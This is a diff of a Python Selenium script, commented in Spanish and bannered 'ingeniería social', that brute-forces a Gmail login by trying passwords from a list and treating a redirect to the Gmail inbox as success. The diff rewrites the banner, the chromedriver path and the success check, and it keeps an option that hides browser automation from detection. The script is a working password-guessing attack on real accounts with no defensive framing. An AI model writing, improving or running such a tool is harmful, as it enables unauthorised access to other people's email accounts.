@@ -14,27 +14,12 @@ init(autoreset=True)
 
 # Título del script en ASCII
 print(Fore.CYAN + """
-
-
-
-                                                        
- # #    #  ####  ###### #    # # ###### #####  #   ##   
- # ##   # #    # #      ##   # # #      #    # #  #  #  
- # # #  # #      #####  # #  # # #####  #    # # #    # 
- # #  # # #  ### #      #  # # # #      #####  # ###### 
- # #   ## #    # #      #   ## # #      #   #  # #    # 
- # #    #  ####  ###### #    # # ###### #    # # #    # 
-                                                        
-                                                        
-  ####   ####   ####  #   ##   #                        
- #      #    # #    # #  #  #  #                        
-  ####  #    # #      # #    # #                        
-      # #    # #      # ###### #                        
- #    # #    # #    # # #    # #                        
-  ####   ####   ####  # #    # ######                   
-                                                        
-
-
+.___                             .__             .__                             .__       .__   
+|   | ____    ____   ____   ____ |__| ___________|__|____      __________   ____ |__|____  |  |  
+|   |/    \  / ___\_/ __ \ /    \|  |/ __ \_  __ \  \__  \    /  ___/  _ \_/ ___\|  \__  \ |  |  
+|   |   |  \/ /_/  >  ___/|   |  \  \  ___/|  | \/  |/ __ \_  \___ (  <_> )  \___|  |/ __ \|  |__
+|___|___|  /\___  / \___  >___|  /__|\___  >__|  |__(____  / /____  >____/ \___  >__(____  /____/
+         \//_____/      \/     \/        \/              \/       \/           \/        \/      
 """ + Fore.RESET)
 
 # Configuración del navegador
@@ -44,8 +29,8 @@ options.add_argument('--disable-blink-features=AutomationControlled')  # Evitar 
 options.add_argument('--start-maximized')  # Maximizar la ventana del navegador
 # options.add_argument('--headless')  # Ejecutar en segundo plano (opcional)
 
-# Ruta al chromedriver
-chromedriver_path = r'C:\xampp\htdocs\engineering_social\chromedriver\chromedriver.exe'
+# Ruta relativa al chromedriver
+chromedriver_path = os.path.join(os.path.dirname(__file__), 'chromedriver', 'chromedriver.exe')
 
 # Usar la clase Service para especificar la ruta del chromedriver
 service = Service(chromedriver_path)
@@ -77,7 +62,7 @@ for password in tqdm(passwords, desc="Probando contraseñas", unit=" contraseña
 
         # Esperar a que el campo de correo electrónico esté disponible
         WebDriverWait(driver, 10).until(
-            EC.presence_of_element_located((By.NAME, 'identifier'))
+            EC.presence_of_element_located((By.TAG_NAME, 'form'))
         )
 
         # Insertar datos en el campo de correo electrónico
@@ -100,13 +85,15 @@ for password in tqdm(passwords, desc="Probando contraseñas", unit=" contraseña
         submit_button_enter.click()
 
         # Esperar a que la página responda
-        WebDriverWait(driver, 10).until(
-            EC.presence_of_element_located((By.XPATH, '//div[contains(text(), "Te damos la bienvenida")]'))  # Ajusta según la respuesta
-        )
-        
-        # Si llegamos aquí, la contraseña es correcta
-        print(Fore.GREEN + f"¡Éxito! La contraseña {password} es correcta." + Fore.RESET)
-        break
+        time.sleep(5)  # Esperar un momento para que la página cargue
+
+        # Verificar si la URL actual es la de Gmail
+        if "https://mail.google.com/mail/u/0/#inbox" in driver.current_url:
+            print(Fore.GREEN + f"¡Éxito! La contraseña {password} es correcta." + Fore.RESET)
+            break
+        else:
+            # Si no se cumple la condición, la contraseña es incorrecta
+            raise TimeoutException
 
     except (NoSuchElementException, TimeoutException):
         # Si falla, mostrar en rojo
